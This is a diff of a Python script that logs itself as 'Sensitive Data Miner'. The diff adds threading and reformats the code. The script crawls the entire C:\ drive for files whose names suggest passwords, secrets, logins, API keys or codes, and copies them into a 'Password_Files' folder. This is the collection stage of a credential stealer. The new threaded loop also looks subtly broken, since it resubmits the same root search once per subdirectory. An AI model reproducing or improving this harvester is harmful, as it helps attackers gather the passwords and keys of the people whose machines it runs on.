@@ -1,38 +1,16 @@
-# TODO Use threading
-
 import shutil
 from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor
 from __lib_class import *
 
 if __name__ == "__main__":
     log = Log({"log_level": DEBUG})
 
-
 # List of allowed extensions
 allowed_extensions = [
-    '.png',
-    '.txt',
-    '.md',
-    '.json',
-    '.yaml',
-    '.secret',
-    '.jpg',
-    '.jpeg',
-    '.password',
-    '.text',
-    '.docx',
-    '.doc',
-    '.xls',
-    '.xlsx',
-    '.csv',
-    '.xml',
-    '.config',
-    '.log',
-    '.pdf',
-    '.zip',
-    '.rar',
-    '.7z',
-    '.tar',
+    ".png", ".txt", ".md", ".json", ".yaml", ".secret", ".jpg", ".jpeg",
+    ".password", ".text", ".docx", ".doc", ".xls", ".xlsx", ".csv",
+    ".xml", ".config", ".log", ".pdf", ".zip", ".rar", ".7z", ".tar"
 ]
 
 
@@ -51,9 +29,9 @@ class Mine:
         for filename in os.listdir(root):
             file_path = root / filename
             if (
-                keyword.lower() in filename.lower()
-                and file_path.is_file()
-                and file_path.suffix in allowed_extensions
+                    keyword.lower() in filename.lower()
+                    and file_path.is_file()
+                    and file_path.suffix in allowed_extensions
             ):
                 matching_files.append(file_path)
         return matching_files
@@ -70,11 +48,11 @@ class Mine:
         """
         try:
             shutil.copy(src_file_path, dst_file_path)
-            log.debug(f'Copied {src_file_path} to {dst_file_path}')
+            log.debug(f"Copied {src_file_path} to {dst_file_path}")
         except FileExistsError as e:
-            log.warning(f'Failed to copy file due to it already existing: {e}')
+            log.warning(f"Failed to copy file due to it already existing: {e}")
         except Exception as e:
-            log.error(f'Failed to copy file: {e}')
+            log.error(f"Failed to copy file: {e}")
 
     def __search_and_copy_files(self, keyword: str):
         """
@@ -84,27 +62,32 @@ class Mine:
         Returns:
             None
         """
-        log.info(f'Searching/Copying file: {keyword}')
-        drives_root = Path('C:\\')
-        destination = Path('Password_Files')
+        log.info(f"Searching/Copying file's with keyword: {keyword}")
+        drives_root = Path("C:\\")
+        destination = Path("Password_Files")
         if not destination.exists():
             destination.mkdir()
-        for root, dirs, files in os.walk(drives_root):
-            for file_path in self.__search_files_by_keyword(Path(root), keyword):
-                dst_file_path = destination / file_path.name
-                self.__copy_file(file_path, dst_file_path)
+
+        with ThreadPoolExecutor() as executor:
+            for root, dirs, files in os.walk(drives_root):
+                future_to_file = {executor.submit(self.__search_files_by_keyword, Path(root), keyword): root_path for
+                                  root_path in dirs}
+                for future in future_to_file:
+                    for file_path in future.result():
+                        dst_file_path = destination / file_path.name
+                        executor.submit(self.__copy_file, file_path, dst_file_path)
 
     def passwords(self):
         """
         Searches for files containing sensitive data keywords in their filenames,
-        copies them to a 'Password Files' directory, and logs the completion of the task.
+        copies them to a "Password Files" directory, and logs the completion of the task.
         Returns:
             None
         """
-        keywords = ['password', 'secret', 'code', 'login', 'api', 'key']
+        keywords = ["password", "secret", "code", "login", "api", "key"]
 
         # Ensure the destination directory is clean
-        destination = Path('Password_Files')
+        destination = Path("Password_Files")
         if destination.exists():
             shutil.rmtree(destination)
         destination.mkdir()
@@ -112,7 +95,8 @@ class Mine:
         for word in keywords:
             self.__search_and_copy_files(word)
 
-        log.info('Sensitive Data Miner Completed')
+        log.info("Sensitive Data Miner Completed")
 
 
+log.warning("Sensitive Data Miner Started, This may take a while... (aka touch some grass)")
 Mine().passwords()
